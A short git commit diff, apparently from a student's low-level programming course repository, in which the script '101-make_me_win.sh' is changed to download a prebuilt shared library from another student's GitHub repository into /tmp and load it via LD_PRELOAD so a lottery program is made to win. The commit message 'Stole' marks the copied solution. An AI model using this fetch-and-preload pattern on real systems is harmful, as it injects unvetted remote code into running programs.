923d5e4366aa05c0a208a5642ada88f26dc983de
kobbyob123 <popolapii@gmail.com>
2022-12-17 01:33:28 +0000

    Stole

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp https://github.com/kobbyob123/alx-low_level_programming/raw/master/0x18-dynamic_libraries/gigawin.so
-export $LD_PRELOAD=/tmp/gigawin.so
+wget -P /tmp/ https://raw.github.com/luischaparroc/holbertonschool-low_level_programming/master/0x18-dynamic_libraries/nrandom.so
+export LD_PRELOAD=/tmp/nrandom.so
